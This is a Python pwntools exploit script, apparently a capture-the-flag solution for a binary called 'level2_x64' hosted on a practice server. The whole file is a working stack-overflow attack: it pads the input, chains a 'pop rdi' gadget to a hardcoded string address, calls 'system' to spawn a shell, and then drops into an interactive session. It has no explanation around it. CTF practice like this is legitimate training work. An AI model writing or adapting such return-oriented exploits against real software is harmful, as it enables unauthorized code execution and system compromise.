import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./level2_x64')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./level2_x64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26649)
			elf=ELF('./level2_x64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		


		io.recv()
		pop_rdi=0x00000000004006b3
		pop_rsi_r15=0x00000000004006b1
		main_addr=0x40061a
		pay='a'*0x88+p64(pop_rdi)+p64(0x600A90)+p64(elf.sym['system'])
		
		io.send(pay)
		
		gdb.attach(io)
		pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue